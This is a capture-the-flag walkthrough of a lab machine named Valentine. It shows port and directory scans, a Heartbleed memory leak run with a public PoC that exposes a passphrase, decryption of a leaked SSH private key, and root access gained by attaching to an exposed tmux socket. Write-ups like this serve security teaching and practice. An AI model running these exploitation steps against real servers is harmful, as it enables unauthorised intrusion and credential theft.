# Valentine

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.85.98
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-02 08:30 EDT
Nmap scan report for 10.129.85.98
Host is up (0.0087s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
```

### Heartbleed

Both the HTTP and HTTPS ports just show this image:

<figure><img src="../../../.gitbook/assets/image (3833).png" alt=""><figcaption></figcaption></figure>

This is a direct hint to use the Heartbleed exploit (the symbol is literally right there!). This exploit takes advantage of the OpenSSL library, allowing attackers to steal information from the memory of the target server.&#x20;

There are tons of PoCs online for this. I used [this](https://gist.github.com/eelsivart/10174134).&#x20;

```
$ python2 exploit.py 10.129.85.98 -p 443 

defribulator v1.16
A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)

##################################################################
Connecting to: 10.129.85.98:443, 1 times
Sending Client Hello for TLSv1.0
Received Server Hello for TLSv1.0

WARNING: 10.129.85.98:443 returned more data than it should - server is vulnerable!
Please wait... connection attempt 1 of 1
##################################################################

.@....SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#.......0.0.1/decode.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==.u.....e......&
```

We can make out some base64 at the end, and when decoded it gives `heartbleedbelievethehype`.&#x20;

### Web Enumeration

I did a `gobuster` scan on the web services to see where we can use this thing.&#x20;

```
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://10.129.85.98 -t 100            
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.85.98
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2023/05/02 08:39:51 Starting gobuster in directory enumeration mode
===============================================================
/dev                  (Status: 301) [Size: 310] [--> http://10.129.85.98/dev/]
```

Found a `/dev` endpoint.&#x20;

<figure><img src="../../../.gitbook/assets/image (2271).png" alt=""><figcaption></figcaption></figure>

The first directory contains a lot of hex characters. We can download this to a file and convert it from hex to string. This would give a private SSH key:

<figure><img src="../../../.gitbook/assets/image (1176).png" alt=""><figcaption></figcaption></figure>

Since we have a password, we can attempt to write decode the key via `openssl`.&#x20;

```
$ openssl rsa -in privkey.txt -out unencrypted
Enter pass phrase for privkey.txt:
writing RSA key
$ chmod 600 unencrypted
```

Afterwards, just SSH in as `hype` using the key and grab the user flag.

## Privilege Escalation&#x20;

After we are in, we can view the bash history file because it is rather large:

```
hype@Valentine:~$ cat .bash_history
exit
exot
exit
ls -la
cd /
ls -la
cd .devs
ls -la
tmux -L dev_sess 
tmux a -t dev_sess 
tmux --help
tmux -S /.devs/dev_sess 
exit
```

So `tmux` is on the machine and it might be running. `tmux` is a terminal multiplexer, which basically means that the terminal is running on another window within the machine. What we can do is just attach ourselves to the existing `tmux` process and get a `root` shell.

```
$ tmux -S /.devs/dev_sess
root@Valentine:/home/hype# id
uid=0(root) gid=0(root) groups=0(root)
```
